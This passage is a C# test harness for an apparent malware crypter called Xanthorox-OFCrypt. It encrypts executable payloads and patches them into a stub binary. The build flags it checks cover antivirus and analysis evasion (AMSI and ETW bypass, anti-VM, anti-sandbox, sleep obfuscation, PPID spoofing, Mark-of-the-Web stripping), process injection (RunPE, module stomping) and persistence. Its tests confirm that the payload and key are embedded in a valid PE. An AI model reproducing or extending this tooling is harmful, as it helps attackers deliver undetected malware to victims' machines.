// ══════════════════════════════════════════════════════════════════════════
//   XANTHOROX-OFCRYPT — AUTOMATED TEST SUITE
//   Tests ALL encryption methods A-Z with real payloads
//   Author: Xanthorox Test Harness (auto-generated)
// ══════════════════════════════════════════════════════════════════════════

using System;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.Text;
using System.Security.Cryptography;
using XanthoroxCrypted.Core;

class TestRunner
{
    static int _passed = 0;
    static int _failed = 0;
    static int _skipped = 0;
    static readonly List<string> _failures = new();

    // ═══════════════════════════════════════════
    //  ENTRY POINT
    // ═══════════════════════════════════════════

    static int Main(string[] args)
    {
        string payloadPath = args.Length > 0 ? args[0] : "test_payload.exe";
        string stubPath = args.Length > 1 ? args[1] : @"..\Bin\Stub\Stub.exe";

        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("══════════════════════════════════════════════════════════");
        Console.WriteLine("  XANTHOROX-OFCRYPT  FULL ENCRYPTION TEST SUITE");
        Console.WriteLine("══════════════════════════════════════════════════════════");
        Console.ResetColor();
        Console.WriteLine();

        // Load real test payload
        byte[] payload;
        if (File.Exists(payloadPath))
        {
            payload = File.ReadAllBytes(payloadPath);
            Info($"Loaded test payload: {payloadPath} ({payload.Length:N0} bytes)");
        }
        else
        {
            // Generate synthetic payload (fake PE)
            payload = GenerateSyntheticPE(8192);
            Info($"Using synthetic PE payload ({payload.Length:N0} bytes)");
        }

        byte[] masterKey = new byte[32];
        RandomNumberGenerator.Fill(masterKey);
        Info($"Generated random master key (32 bytes)");
        Console.WriteLine();

        // ═══ SECTION 1: Standard Ciphers ═══
        Section("STANDARD CIPHERS (CryptoEngine)");
        TestStandardCipher(payload, masterKey, CipherType.AES256, "AES-256-CBC");
        TestStandardCipher(payload, masterKey, CipherType.ChaCha20, "ChaCha20 (SHA-512 Sim)");
        TestStandardCipher(payload, masterKey, CipherType.RC4, "RC4");
        TestStandardCipher(payload, masterKey, CipherType.XOR, "XOR");
        Console.WriteLine();

        // ═══ SECTION 2: Research Packages ═══
        Section("RESEARCH PACKAGES");
        TestGhostProtocol(payload, masterKey);
        TestDarknetCipher(payload, masterKey);
        TestVoidWalker(payload, masterKey);
        TestNeuromancer(payload, masterKey);
        Console.WriteLine();

        // ═══ SECTION 3: Entropy Normalization ═══
        Section("ENTROPY NORMALIZATION");
        TestEntropyNorm(payload);
        Console.WriteLine();

        // ═══ SECTION 4: Config Layout ═══
        Section("CONFIG LAYOUT (StubConfig / BuildConfig)");
        TestConfigLayout();
        Console.WriteLine();

        // ═══ SECTION 5: Config Validator ═══
        Section("CONFIG VALIDATOR");
        TestConfigValidator();
        Console.WriteLine();

        // ═══ SECTION 6: Stub Patching ═══
        Section("STUB PATCHING");
        TestStubPatching(payload, masterKey, stubPath);
        Console.WriteLine();

        // ═══ SECTION 7: Key Sizes & Edge Cases ═══
        Section("EDGE CASES & KEY SIZES");
        TestEdgeCases(masterKey);
        Console.WriteLine();

        // ═══ SECTION 8: Real-Life Integration (Build + Verify Embedded) ═══
        Section("REAL-LIFE INTEGRATION (Build Patched Stub → Verify Embedded Data)");
        TestRealLifeIntegration(payload, masterKey, stubPath);
        Console.WriteLine();

        // ═══ SECTION 9: Pentest Delivery Simulation ═══
        TestPentestDelivery(payload, masterKey, stubPath);
        Console.WriteLine();

        // ═══ SUMMARY ═══
        Console.WriteLine("══════════════════════════════════════════════════════════");
        Console.ForegroundColor = ConsoleColor.Green;
        Console.Write($"  PASSED: {_passed}");
        Console.ResetColor();
        Console.Write("  |  ");
        Console.ForegroundColor = _failed > 0 ? ConsoleColor.Red : ConsoleColor.Green;
        Console.Write($"FAILED: {_failed}");
        Console.ResetColor();
        Console.Write("  |  ");
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine($"SKIPPED: {_skipped}");
        Console.ResetColor();
        Console.WriteLine("══════════════════════════════════════════════════════════");

        if (_failures.Count > 0)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\nFAILED TESTS:");
            foreach (var f in _failures)
                Console.WriteLine($"  ✗ {f}");
            Console.ResetColor();
        }

        // Write report file
        WriteReport(payloadPath);

        return _failed > 0 ? 1 : 0;
    }

    // ═══════════════════════════════════════════
    //  STANDARD CIPHER TESTS
    // ═══════════════════════════════════════════

    static void TestStandardCipher(byte[] payload, byte[] key, CipherType cipher, string name)
    {
        try
        {
            // Encrypt
            byte[] encrypted = CryptoEngine.Encrypt(payload, key, cipher);

            // Verify ciphertext is different from plaintext
            bool isDifferent = !encrypted.SequenceEqual(payload);
            Assert($"{name}: Ciphertext differs from plaintext", isDifferent);

            // Verify ciphertext length is reasonable
            bool sizeOk = encrypted.Length >= payload.Length;
            Assert($"{name}: Ciphertext size >= plaintext ({encrypted.Length} >= {payload.Length})", sizeOk);

            // For symmetric stream ciphers (XOR, RC4, ChaCha20), re-encrypting = decrypt
            // For AES-CBC, the C# builder has separate decrypt internally
            if (cipher == CipherType.XOR)
            {
                // XOR is self-inverse
                byte[] decrypted = CryptoEngine.Encrypt(encrypted, key, cipher);
                bool roundTrip = decrypted.SequenceEqual(payload);
                Assert($"{name}: Encrypt→Encrypt roundtrip (self-inverse)", roundTrip);
            }
            else if (cipher == CipherType.RC4)
            {
                // RC4 is self-inverse (same key produces same keystream)
                byte[] decrypted = CryptoEngine.Encrypt(encrypted, key, cipher);
                bool roundTrip = decrypted.SequenceEqual(payload);
                Assert($"{name}: Encrypt→Encrypt roundtrip (self-inverse)", roundTrip);
            }
            else if (cipher == CipherType.ChaCha20)
            {
                // ChaCha20 sim is XOR-based → self-inverse
                byte[] decrypted = CryptoEngine.Encrypt(encrypted, key, cipher);
                bool roundTrip = decrypted.SequenceEqual(payload);
                Assert($"{name}: Encrypt→Encrypt roundtrip (self-inverse)", roundTrip);
            }
            else if (cipher == CipherType.AES256)
            {
                // AES-CBC: encrypt prepends IV + adds PKCS7 padding
                // Output = IV(16) + padded ciphertext. PKCS7 adds 1-16 bytes.
                // So output size = payload + 16(IV) + padding(1-16)
                int paddingSize = 16 - (payload.Length % 16);
                int expectedAesSize = payload.Length + 16 + paddingSize;
                bool sizeCorrect = encrypted.Length == expectedAesSize;
                Assert($"{name}: AES output = IV(16) + payload + PKCS7({paddingSize}) = {expectedAesSize} (got {encrypted.Length})", sizeCorrect);

                // Verify AES roundtrip using .NET Aes directly
                byte[] iv = encrypted[..16];
                byte[] cipherOnly = encrypted[16..];
                using var aes = System.Security.Cryptography.Aes.Create();
                aes.Mode = System.Security.Cryptography.CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = PadKey(key, 32);
                aes.IV = iv;
                using var dec = aes.CreateDecryptor();
                byte[] decrypted = dec.TransformFinalBlock(cipherOnly, 0, cipherOnly.Length);
                bool roundTrip = decrypted.SequenceEqual(payload);
                Assert($"{name}: AES-CBC roundtrip via .NET decrypt", roundTrip);
            }

            // Entropy check: encrypted data should have high entropy
            // XOR with short repeating key on structured PE won't reach 7.0
            double minEntropy = (cipher == CipherType.XOR) ? 5.0 : 7.0;
            double entropy = CalculateEntropy(encrypted);
            Assert($"{name}: Ciphertext entropy > {minEntropy} bits/byte ({entropy:F2})", entropy > minEntropy);
        }
        catch (Exception ex)
        {
            Fail($"{name}: EXCEPTION — {ex.Message}");
        }
    }

    // ═══════════════════════════════════════════
    //  GHOST PROTOCOL TEST
    // ═══════════════════════════════════════════

    static void TestGhostProtocol(byte[] payload, byte[] key)
    {
        try
        {
            var (encrypted, ghostParams) = GhostProtocol.Encrypt(payload, key);

            Assert("Ghost Protocol: Encrypt produced output", encrypted != null && encrypted.Length > 0);
            Assert("Ghost Protocol: Ciphertext differs from plaintext", !encrypted.SequenceEqual(payload));
            Assert("Ghost Protocol: Output size matches input", encrypted.Length == payload.Length);

            // Serialize params and verify size
            byte[] serialized = GhostProtocol.SerializeParams(ghostParams);
            Assert($"Ghost Protocol: Params size = 271 bytes (got {serialized.Length})", serialized.Length == 271);

            // Verify param fields are populated
            Assert("Ghost Protocol: AffineMul is odd (coprime)", (ghostParams.AffineMul & 1) == 1);
            Assert("Ghost Protocol: LayerOrder < 120", ghostParams.LayerOrder < 120);
            Assert("Ghost Protocol: InvSBox is 256 bytes", ghostParams.InvSBox?.Length == 256);
            Assert("Ghost Protocol: BitPerm is 8 bytes", ghostParams.BitPerm?.Length == 8);

            // Verify S-box is a valid permutation (all 256 values present)
            bool sboxValid = ghostParams.SBox != null && ghostParams.SBox.Distinct().Count() == 256;
            Assert("Ghost Protocol: S-Box is valid permutation (256 unique values)", sboxValid);

            // Verify InvSBox inverts SBox
            bool invValid = true;
            if (ghostParams.SBox != null && ghostParams.InvSBox != null)
            {
                for (int i = 0; i < 256; i++)
                {
                    if (ghostParams.InvSBox[ghostParams.SBox[i]] != i)
                    { invValid = false; break; }
                }
            }
            Assert("Ghost Protocol: InvSBox correctly inverts SBox", invValid);

            // Verify affine modular inverse
            int check = (ghostParams.AffineMul * ghostParams.AffineMulInv) & 0xFF;
            Assert($"Ghost Protocol: AffineMul * AffineMulInv ≡ 1 (mod 256) [{ghostParams.AffineMul}×{ghostParams.AffineMulInv}={check}]", check == 1);
        }
        catch (Exception ex)
        {
            Fail($"Ghost Protocol: EXCEPTION — {ex.Message}");
        }
    }

    // ═══════════════════════════════════════════
    //  DARKNET CIPHER TEST
    // ═══════════════════════════════════════════

    static void TestDarknetCipher(byte[] payload, byte[] key)
    {
        try
        {
            var (encrypted, darkParams) = DarknetCipher.Encrypt(payload, key);

            Assert("Darknet Cipher: Encrypt produced output", encrypted != null && encrypted.Length > 0);
            Assert("Darknet Cipher: Ciphertext differs from plaintext", !encrypted.SequenceEqual(payload));

            // Darknet pads to 8-byte block boundary
            int expectedSize = payload.Length + (8 - payload.Length % 8) % 8;
            Assert($"Darknet Cipher: Output padded to 8-byte blocks ({encrypted.Length} >= {expectedSize})",
                encrypted.Length >= expectedSize);

            // Serialize params and verify size
            byte[] serialized = DarknetCipher.SerializeParams(darkParams);
            Assert($"Darknet Cipher: Params size = 4236 bytes (got {serialized.Length})", serialized.Length == 4236);

            // Verify param fields
            Assert("Darknet Cipher: Nonce is 12 bytes", darkParams.Nonce?.Length == 12);
            Assert("Darknet Cipher: WhiteningKey is 32 bytes", darkParams.WhiteningKey?.Length == 32);
            Assert("Darknet Cipher: PBox is 32 bytes", darkParams.PBox?.Length == 32);
            Assert("Darknet Cipher: RoundKeys is 16 entries", darkParams.RoundKeys?.Length == 16);

            // Verify PBox is valid permutation of 0-31
            bool pboxValid = darkParams.PBox != null && darkParams.PBox.Distinct().Count() == 32;
            Assert("Darknet Cipher: PBox is valid permutation (32 unique values)", pboxValid);

            // Verify 16 round S-boxes exist
            Assert("Darknet Cipher: 16 round S-Boxes present", darkParams.RoundSBoxes?.Length == 16);
            if (darkParams.RoundSBoxes != null)
            {
                bool allValid = darkParams.RoundSBoxes.All(sb => sb?.Length == 256 && sb.Distinct().Count() == 256);
                Assert("Darknet Cipher: All 16 S-Boxes are valid permutations", allValid);
            }
        }
        catch (Exception ex)
        {
            Fail($"Darknet Cipher: EXCEPTION — {ex.Message}");
        }
    }

    // ═══════════════════════════════════════════
    //  VOID WALKER TEST
    // ═══════════════════════════════════════════

    static void TestVoidWalker(byte[] payload, byte[] key)
    {
        try
        {
            var (encrypted, voidParams) = VoidWalker.Encrypt(payload, key);

            Assert("VOID WALKER: Encrypt produced output", encrypted != null && encrypted.Length > 0);
            Assert("VOID WALKER: Ciphertext differs from plaintext", !encrypted.SequenceEqual(payload));
            Assert("VOID WALKER: Output size matches input", encrypted.Length == payload.Length);

            // Serialize params and verify size
            byte[] serialized = VoidWalker.SerializeParams(voidParams);
            Assert($"VOID WALKER: Params size = 59 bytes (got {serialized.Length})", serialized.Length == 59);

            // Verify param fields
            Assert("VOID WALKER: Nonce is 12 bytes", voidParams.Nonce?.Length == 12);
            Assert("VOID WALKER: Salt is 16 bytes", voidParams.Salt?.Length == 16);
            Assert("VOID WALKER: SipKey is 16 bytes", voidParams.SipKey?.Length == 16);
            Assert("VOID WALKER: MAC is non-zero", voidParams.MAC != 0);
            Assert("VOID WALKER: RdtscThreshold > 0", voidParams.RdtscThreshold > 0);

            // Verify MAC is non-trivial (SipHash24 is private, so test consistency via double-encrypt)
            Assert("VOID WALKER: MAC is non-trivial (not all zeros)", voidParams.MAC != 0);

            // Verify params serialization layout:
            // [Nonce(12)][Salt(16)][SipKey(16)][MAC(8)][PolyVariant(1)][JunkSeed(4)][RdtscThreshold(2)] = 59
            Assert("VOID WALKER: Nonce at offset 0", serialized[..12].SequenceEqual(voidParams.Nonce!));
            Assert("VOID WALKER: Salt at offset 12", serialized[12..28].SequenceEqual(voidParams.Salt!));
            Assert("VOID WALKER: SipKey at offset 28", serialized[28..44].SequenceEqual(voidParams.SipKey!));
            ulong macFromSerialized = BitConverter.ToUInt64(serialized, 44);
            Assert("VOID WALKER: MAC at offset 44", macFromSerialized == voidParams.MAC);
        }
        catch (Exception ex)
        {
            Fail($"VOID WALKER: EXCEPTION — {ex.Message}");
        }
    }

    // ═══════════════════════════════════════════
    //  NEUROMANCER TEST
    // ═══════════════════════════════════════════

    static void TestNeuromancer(byte[] payload, byte[] key)
    {
        try
        {
            // Neuromancer uses local machine environment by default
            var (encrypted, neuroParams) = Neuromancer.Encrypt(payload, key);

            Assert("Neuromancer: Encrypt produced output", encrypted != null && encrypted.Length > 0);
            Assert("Neuromancer: Ciphertext differs from plaintext", !encrypted.SequenceEqual(payload));
            Assert("Neuromancer: Output size matches input", encrypted.Length == payload.Length);

            // Serialize params and verify size
            byte[] serialized = Neuromancer.SerializeParams(neuroParams);
            Assert($"Neuromancer: Params size = 62 bytes (got {serialized.Length})", serialized.Length == 62);

            // Verify param fields
            Assert("Neuromancer: EnvHash is 32 bytes", neuroParams.EnvHash?.Length == 32);
            Assert("Neuromancer: Nonce is 12 bytes", neuroParams.Nonce?.Length == 12);
            Assert("Neuromancer: Salt is 16 bytes", neuroParams.Salt?.Length == 16);
            Assert("Neuromancer: TimeLockRounds > 0", neuroParams.TimeLockRounds > 0);

            // Verify serialization layout:
            // [EnvHash(32)][TimeLockRounds(2)][Nonce(12)][Salt(16)] = 62
            Assert("Neuromancer: EnvHash at offset 0", serialized[..32].SequenceEqual(neuroParams.EnvHash!));
            ushort roundsFromSerialized = BitConverter.ToUInt16(serialized, 32);
            Assert($"Neuromancer: TimeLockRounds at offset 32 ({roundsFromSerialized})", roundsFromSerialized == neuroParams.TimeLockRounds);
            Assert("Neuromancer: Nonce at offset 34", serialized[34..46].SequenceEqual(neuroParams.Nonce!));
            Assert("Neuromancer: Salt at offset 46", serialized[46..62].SequenceEqual(neuroParams.Salt!));

            // Run encryption twice — should produce different ciphertext (random nonce/salt)
            var (encrypted2, _) = Neuromancer.Encrypt(payload, key);
            Assert("Neuromancer: Two encryptions produce different ciphertext (random nonce)", !encrypted.SequenceEqual(encrypted2));
        }
        catch (Exception ex)
        {
            Fail($"Neuromancer: EXCEPTION — {ex.Message}");
        }
    }

    // ═══════════════════════════════════════════
    //  ENTROPY NORMALIZATION TEST
    // ═══════════════════════════════════════════

    static void TestEntropyNorm(byte[] payload)
    {
        try
        {
            // Encode
            byte[] encoded = EntropyNorm.Encode(payload);

            Assert("EntropyNorm: Encoded size = input + 1", encoded.Length == payload.Length + 1);
            Assert("EntropyNorm: Marker byte 0xEE at position 0", encoded[0] == 0xEE);
            Assert("EntropyNorm: Encoded data differs from input", !encoded[1..].SequenceEqual(payload));

            // Decode roundtrip
            byte[] decoded = EntropyNorm.Decode(encoded);
            Assert("EntropyNorm: Decoded size = original size", decoded.Length == payload.Length);
            Assert("EntropyNorm: Decode(Encode(data)) == data (perfect roundtrip)", decoded.SequenceEqual(payload));

            // Test with non-normalized data (no 0xEE marker) — should passthrough
            byte[] raw = new byte[] { 0x41, 0x42, 0x43 };
            byte[] passthrough = EntropyNorm.Decode(raw);
            Assert("EntropyNorm: Non-normalized data passes through unchanged", passthrough.SequenceEqual(raw));

            // Verify affine math: enc(x) = (183*x + 61) & 0xFF
            bool mathCorrect = true;
            for (int x = 0; x < 256; x++)
            {
                byte enc = (byte)((183 * x + 61) & 0xFF);
                byte dec = (byte)((7 * enc + 85) & 0xFF);
                if (dec != x) { mathCorrect = false; break; }
            }
            Assert("EntropyNorm: Affine math verified (183×7 ≡ 1 mod 256, all 256 values roundtrip)", mathCorrect);
        }
        catch (Exception ex)
        {
            Fail($"EntropyNorm: EXCEPTION — {ex.Message}");
        }
    }

    // ═══════════════════════════════════════════
    //  CONFIG LAYOUT TEST
    // ═══════════════════════════════════════════

    static void TestConfigLayout()
    {
        try
        {
            var cfg = new BuildConfig();
            byte[] bytes = cfg.ToBytes();
            Assert("Config: ToBytes() size = 32", bytes.Length == 32);
            Assert("Config: All bytes zero when all bools false", bytes.All(b => b == 0));

            // Set each toggle and verify correct index
            var toggles = new (Action<BuildConfig> setter, int index, string name)[]
            {
                (c => c.AntiDebug = true,     0,  "AntiDebug"),
                (c => c.AntiVM = true,        1,  "AntiVM"),
                (c => c.AntiSandbox = true,   2,  "AntiSandbox"),
                (c => c.AMSI = true,          3,  "AMSI"),
                (c => c.ETW = true,           4,  "ETW"),
                (c => c.Fibers = true,        5,  "Fibers"),
                (c => c.RunPE = true,         6,  "RunPE"),
                (c => c.ModuleStomp = true,   7,  "ModuleStomp"),
                (c => c.Persist = true,       8,  "Persist"),
                (c => c.Melt = true,          9,  "Melt"),
                (c => c.FakeError = true,     10, "FakeError"),
                (c => c.SleepObf = true,      11, "SleepObf"),
                (c => c.PPIDSpoof = true,     12, "PPIDSpoof"),
                (c => c.EntropyNorm = true,   13, "EntropyNorm"),
                (c => c.Syscalls = true,      14, "Syscalls"),
                (c => c.ThreadPool = true,    15, "ThreadPool"),
                (c => c.GuardPage = true,     16, "GuardPage"),
                (c => c.HWIDBind = true,      17, "HWIDBind"),
                (c => c.PhantomDLL = true,    18, "PhantomDLL"),
                (c => c.CallbackDiv = true,   19, "CallbackDiv"),
                (c => c.MotwStrip = true,     20, "MotwStrip"),
                (c => c.AntiEmulation = true, 21, "AntiEmulation"),
                (c => c.StagedLoad = true,    22, "StagedLoad"),
            };

            foreach (var (setter, idx, name) in toggles)
            {
                var testCfg = new BuildConfig();
                setter(testCfg);
                byte[] testBytes = testCfg.ToBytes();
                Assert($"Config: {name} → byte[{idx}] = 1", testBytes[idx] == 1);
            }

            // Verify EncAlgorithm at index 23
            var algCfg = new BuildConfig { EncAlgorithm = 2 };
            Assert("Config: EncAlgorithm at byte[23]", algCfg.ToBytes()[23] == 2);

            // Verify ResearchPackage at index 24
            var resCfg = new BuildConfig { ResearchPackage = 4 };
            Assert("Config: ResearchPackage at byte[24]", resCfg.ToBytes()[24] == 4);

            // Verify padding bytes 25-31 are zero
            var fullCfg = new BuildConfig
            {
                AntiDebug = true, AntiVM = true, AntiSandbox = true,
                EncAlgorithm = 3, ResearchPackage = 1
            };
            byte[] fb = fullCfg.ToBytes();
            Assert("Config: Padding bytes[25..31] are zero", fb[25..32].All(b => b == 0));
        }
        catch (Exception ex)
        {
            Fail($"Config Layout: EXCEPTION — {ex.Message}");
        }
    }

    // ═══════════════════════════════════════════
    //  CONFIG VALIDATOR TEST
    // ═══════════════════════════════════════════

    static void TestConfigValidator()
    {
        try
        {
            // Test 1: Melt + Persist conflict
            var cfg1 = new BuildConfig { Melt = true, Persist = true };
            var result1 = ConfigValidator.ValidateAndFix(cfg1);
            Assert("Validator: Melt+Persist → Persist disabled", cfg1.Persist == false);
            Assert("Validator: Melt+Persist → AutoFixed flagged", result1.AutoFixed);
            Assert("Validator: Melt+Persist → IsValid", result1.IsValid);

            // Test 2: Multiple execution methods
            var cfg2 = new BuildConfig { PhantomDLL = true, ThreadPool = true, RunPE = true };
            var result2 = ConfigValidator.ValidateAndFix(cfg2);
            Assert("Validator: Multi-exec → PhantomDLL kept (highest priority)", cfg2.PhantomDLL == true);
            Assert("Validator: Multi-exec → ThreadPool disabled", cfg2.ThreadPool == false);
            Assert("Validator: Multi-exec → RunPE disabled", cfg2.RunPE == false);

            // Test 3: Clean config — no warnings
            var cfg3 = new BuildConfig { AntiDebug = true, EncAlgorithm = 0 };
            var result3 = ConfigValidator.ValidateAndFix(cfg3);
            Assert("Validator: Clean config → no errors", result3.IsValid);
            Assert("Validator: Clean config → not auto-fixed", !result3.AutoFixed);

            // Test 4: HWID Bind warning
            var cfg4 = new BuildConfig { HWIDBind = true };
            var result4 = ConfigValidator.ValidateAndFix(cfg4);
            Assert("Validator: HWIDBind → has warning", result4.Warnings.Count > 0);
            Assert("Validator: HWIDBind → still valid", result4.IsValid);

            // Test 5: SleepObf + StagedLoad warning
            var cfg5 = new BuildConfig { SleepObf = true, StagedLoad = true };
            var result5 = ConfigValidator.ValidateAndFix(cfg5);
            Assert("Validator: SleepObf+StagedLoad → has warning", result5.Warnings.Count > 0);
        }
        catch (Exception ex)
        {
            Fail($"Config Validator: EXCEPTION — {ex.Message}");
        }
    }

    // ═══════════════════════════════════════════
    //  STUB PATCHING TEST
    // ═══════════════════════════════════════════

    static void TestStubPatching(byte[] payload, byte[] key, string stubPath)
    {
        if (!File.Exists(stubPath))
        {
            Skip("StubPatcher: Stub.exe not found — skipping patching tests");
            return;
        }

        try
        {
            byte[] stubData = File.ReadAllBytes(stubPath);

            // Test marker detection
            string[] markers = { "XCONFIG", "XKEYBLK", "XPAYLOD", "XRESRC\0" };
            foreach (string m in markers)
            {
                byte[] markerBytes = Encoding.ASCII.GetBytes(m);
                int idx = FindMarker(stubData, markerBytes);
                Assert($"StubPatcher: Marker '{m.TrimEnd('\0')}' found in Stub.exe (offset {idx})", idx >= 0);
            }

            // Test full patching pipeline with each cipher
            foreach (var cipher in new[] { CipherType.AES256, CipherType.XOR })
            {
                string cipherName = cipher.ToString();
                byte[] encrypted = CryptoEngine.Encrypt(payload, key, cipher);

                var config = new BuildConfig
                {
                    AntiDebug = true,
                    AntiVM = true,
                    EncAlgorithm = (byte)cipher,
                    ResearchPackage = 0
                };

                string outputPath = Path.Combine(Path.GetTempPath(), $"test_patched_{cipherName}.exe");
                try
                {
                    string result = StubPatcher.Build(stubPath, outputPath, encrypted, key, config);
                    Assert($"StubPatcher ({cipherName}): Build succeeded (no error)", string.IsNullOrEmpty(result));

                    if (File.Exists(outputPath))
                    {
                        byte[] patched = File.ReadAllBytes(outputPath);
                        Assert($"StubPatcher ({cipherName}): Output is valid PE (MZ header)", patched[0] == 'M' && patched[1] == 'Z');
                        Assert($"StubPatcher ({cipherName}): Output size > stub size (payload embedded)", patched.Length >= stubData.Length);
                    }
                }
                finally
                {
                    if (File.Exists(outputPath)) File.Delete(outputPath);
                }
            }

            // Test with research package (Ghost)
            try
            {
                var (ghostEnc, ghostParams) = GhostProtocol.Encrypt(payload, key);
                byte[] researchParamBytes = GhostProtocol.SerializeParams(ghostParams);

                var ghostConfig = new BuildConfig
                {
                    AntiDebug = true,
                    EncAlgorithm = 3, // XOR (dummy, research package overrides)
                    ResearchPackage = 1 // Ghost
                };

                string ghostOutput = Path.Combine(Path.GetTempPath(), "test_patched_ghost.exe");
                try
                {
                    string result = StubPatcher.Build(stubPath, ghostOutput, ghostEnc, key, ghostConfig, researchParamBytes);
                    Assert("StubPatcher (Ghost): Build with research params succeeded", string.IsNullOrEmpty(result));

                    if (File.Exists(ghostOutput))
                    {
                        byte[] patched = File.ReadAllBytes(ghostOutput);
                        Assert("StubPatcher (Ghost): Output is valid PE", patched[0] == 'M' && patched[1] == 'Z');
                    }
                }
                finally
                {
                    if (File.Exists(ghostOutput)) File.Delete(ghostOutput);
                }
            }
            catch (Exception ex)
            {
                Fail($"StubPatcher (Ghost): EXCEPTION — {ex.Message}");
            }
        }
        catch (Exception ex)
        {
            Fail($"StubPatcher: EXCEPTION — {ex.Message}");
        }
    }

    // ═══════════════════════════════════════════
    //  EDGE CASES
    // ═══════════════════════════════════════════

    static void TestEdgeCases(byte[] key)
    {
        try
        {
            // Small payload (1 byte)
            byte[] tiny = new byte[] { 0x42 };
            foreach (var cipher in new[] { CipherType.XOR, CipherType.RC4, CipherType.ChaCha20 })
            {
                byte[] enc = CryptoEngine.Encrypt(tiny, key, cipher);
                byte[] dec = CryptoEngine.Encrypt(enc, key, cipher);
                Assert($"Edge: 1-byte payload roundtrip ({cipher})", dec.SequenceEqual(tiny));
            }

            // Large payload (1MB)
            byte[] large = new byte[1024 * 1024];
            RandomNumberGenerator.Fill(large);
            foreach (var cipher in new[] { CipherType.XOR, CipherType.RC4 })
            {
                var sw = Stopwatch.StartNew();
                byte[] enc = CryptoEngine.Encrypt(large, key, cipher);
                sw.Stop();
                Assert($"Edge: 1MB payload {cipher} encrypt < 1s ({sw.ElapsedMilliseconds}ms)", sw.ElapsedMilliseconds < 1000);
                byte[] dec = CryptoEngine.Encrypt(enc, key, cipher);
                Assert($"Edge: 1MB payload {cipher} roundtrip", dec.SequenceEqual(large));
            }

            // Different key sizes
            foreach (int keySize in new[] { 16, 24, 32, 64 })
            {
                byte[] testKey = new byte[keySize];
                RandomNumberGenerator.Fill(testKey);
                byte[] testData = new byte[256];
                RandomNumberGenerator.Fill(testData);

                byte[] enc = CryptoEngine.Encrypt(testData, testKey, CipherType.XOR);
                byte[] dec = CryptoEngine.Encrypt(enc, testKey, CipherType.XOR);
                Assert($"Edge: XOR with {keySize}-byte key roundtrip", dec.SequenceEqual(testData));
            }

            // Entropy norm with single byte
            byte[] single = new byte[] { 0xFF };
            byte[] encSingle = EntropyNorm.Encode(single);
            byte[] decSingle = EntropyNorm.Decode(encSingle);
            Assert("Edge: EntropyNorm single-byte roundtrip", decSingle.SequenceEqual(single));
        }
        catch (Exception ex)
        {
            Fail($"Edge Cases: EXCEPTION — {ex.Message}");
        }
    }

    // ═══════════════════════════════════════════
    //  REAL-LIFE INTEGRATION TESTS
    //  Builds patched stubs with ALL methods, verifies embedded data
    // ═══════════════════════════════════════════

    static void TestRealLifeIntegration(byte[] payload, byte[] masterKey, string stubPath)
    {
        if (!File.Exists(stubPath))
        {
            Skip("Integration: Stub.exe not found — skipping all integration tests");
            return;
        }

        byte[] originalStub = File.ReadAllBytes(stubPath);
        string tempDir = Path.Combine(Path.GetTempPath(), "xanthorox_integration_tests");
        if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);

        // Pre-compute marker offsets from the UNPATCHED stub (before PEMutator runs)
        // PEMutator works in-place (no byte insertions), so offsets are stable.
        int stubResearchMarker = FindMarker(originalStub, Encoding.ASCII.GetBytes("XRESRC\0"));
        int stubResearchData = stubResearchMarker >= 0 ? stubResearchMarker + 8 + 4 : -1; // marker(8) + size(4)
        int stubPayloadMarker = FindMarker(originalStub, Encoding.ASCII.GetBytes("XPAYLOD"));
        int stubPayloadData = stubPayloadMarker >= 0 ? stubPayloadMarker + 8 + 4 : -1; // marker(8) + size(4)

        try
        {
            // ═══ TEST ALL 4 STANDARD CIPHERS ═══
            var standardCiphers = new[]
            {
                (CipherType.AES256,   "AES-256-CBC", (byte)0),
                (CipherType.ChaCha20, "ChaCha20",    (byte)1),
                (CipherType.RC4,      "RC4",         (byte)2),
                (CipherType.XOR,      "XOR",         (byte)3),
            };

            foreach (var (cipher, cipherName, cipherByte) in standardCiphers)
            {
                string outputPath = Path.Combine(tempDir, $"integration_{cipherName}.exe");
                try
                {
                    byte[] encrypted = CryptoEngine.Encrypt(payload, masterKey, cipher);

                    var config = new BuildConfig
                    {
                        AntiDebug = true, AntiVM = true, AntiSandbox = true,
                        AMSI = true, ETW = true, SleepObf = true,
                        EncAlgorithm = cipherByte, ResearchPackage = 0
                    };

                    string buildResult = StubPatcher.Build(stubPath, outputPath, encrypted, masterKey, config);
                    Assert($"Integration [{cipherName}]: Build succeeded", string.IsNullOrEmpty(buildResult));

                    if (!File.Exists(outputPath)) { Fail($"Integration [{cipherName}]: Output not created"); continue; }

                    byte[] patched = File.ReadAllBytes(outputPath);

                    // Verify PE header
                    Assert($"Integration [{cipherName}]: Valid PE (MZ)", patched.Length > 2 && patched[0] == 'M' && patched[1] == 'Z');

                    // Verify encrypted payload — exact byte match at known offset
                    if (stubPayloadData >= 0 && stubPayloadData + encrypted.Length <= patched.Length)
                    {
                        bool payloadExact = true;
                        for (int i = 0; i < Math.Min(64, encrypted.Length); i++)
                        {
                            if (patched[stubPayloadData + i] != encrypted[i]) { payloadExact = false; break; }
                        }
                        Assert($"Integration [{cipherName}]: Encrypted payload exact match at offset {stubPayloadData}", payloadExact);
                    }
                    else
                    {
                        byte[] encSig = encrypted.Length >= 32 ? encrypted[..32] : encrypted;
                        Assert($"Integration [{cipherName}]: Encrypted payload found", FindMarker(patched, encSig) >= 0);
                    }

                    // Verify master key is embedded
                    int kOff = FindMarker(patched, masterKey);
                    Assert($"Integration [{cipherName}]: Master key embedded (offset {kOff})", kOff >= 0);

                    // Verify config flags in binary
                    // PEMutator.EncryptStringTable scrambles marker text post-patch,
                    // so we locate config data relative to the key position.
                    // Layout: [XCONFIG(7)+gap(1)+config(32)] [XKEYBLK(7)+gap(1)+key(32)]
                    // Config data = keyOffset - 40
                    if (kOff >= 40)
                    {
                        int cfgData = kOff - 40;  // config(32) + marker+gap(8) before key
                        Assert($"Integration [{cipherName}]: EncAlgorithm={cipherByte} in config", patched[cfgData + 23] == cipherByte);
                        Assert($"Integration [{cipherName}]: AntiDebug flag set",  patched[cfgData + 0] == 1);
                        Assert($"Integration [{cipherName}]: AntiVM flag set",     patched[cfgData + 1] == 1);
                        Assert($"Integration [{cipherName}]: AMSI flag set",       patched[cfgData + 3] == 1);
                        Assert($"Integration [{cipherName}]: SleepObf flag set",   patched[cfgData + 11] == 1);
                    }
